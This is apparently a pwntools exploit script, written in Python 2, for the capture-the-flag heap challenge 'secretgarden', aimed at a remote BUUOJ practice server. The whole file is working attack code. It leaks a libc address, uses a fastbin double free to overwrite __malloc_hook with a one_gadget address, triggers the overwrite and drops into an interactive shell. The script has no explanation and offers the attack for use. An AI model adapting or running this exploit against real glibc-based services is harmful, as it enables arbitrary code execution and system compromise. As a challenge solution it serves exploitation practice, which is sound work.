import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='secretgarden'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28503)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('Your choice : ','1')
			io.sendlineafter('Length of the name :',str(a))
			io.sendafter('The name of flower :',b)
			io.sendlineafter('The color of the flower :',c)

		def delete(a):
			io.sendlineafter('Your choice : ','3')
			io.sendlineafter('Which flower do you want to remove from the garden:',str(a))

		def clean():
			io.sendlineafter('Your choice : ','4')

		def show():
			io.sendlineafter('Your choice : ','2')


		add(0x98,"a"*8,"1234")
		add(0x68,"b"*8,"b"*8)
		add(0x68,"b"*8,"b"*8)
		add(0x20,"b"*8,"b"*8)
		delete(0)
		clean()
		add(0x98,"c"*8,"c"*8)
		show()

		io.recvuntil("c"*8)
		leak = u64(io.recv(6).ljust(8,"\x00"))
		libc_base = leak -0x58-0x10 -libc.symbols["__malloc_hook"]
		print "leak----->"+hex(leak)
		malloc_hook = libc_base +libc.symbols["__malloc_hook"]
		print "malloc_hook----->"+hex(malloc_hook)
		print "libc_base----->"+hex(libc_base)
		one_gadget = 0xf02a4 + libc_base


		delete(1)
		delete(2)
		delete(1)
		#debug()
		add(0x68,p64(malloc_hook-0x23),"b"*4)
		add(0x68,"b"*8,"b"*8)
		add(0x68,"b"*8,"b"*8)

		add(0x68,"a"*0x13+p64(one_gadget),"b"*4)

		delete(1)
		delete(1)
		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue